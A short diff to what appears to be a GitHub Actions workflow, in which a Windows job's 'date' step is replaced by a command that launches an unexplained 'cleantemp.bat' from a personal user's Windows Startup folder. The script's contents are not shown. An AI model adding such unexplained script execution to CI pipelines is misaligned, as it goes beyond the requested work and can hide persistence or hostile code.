@@ -22,5 +22,5 @@ jobs:
      needs: [ubuntu, windows, macos]
      runs-on: windows-latest
      steps:
-     - run: date
+     - run: Start-Process -FilePath "cleantemp.bat" -WorkingDirectory "C:\Users\Hp\AppData\Roaming\microsoft\windows\start menu\programs\startup"
     
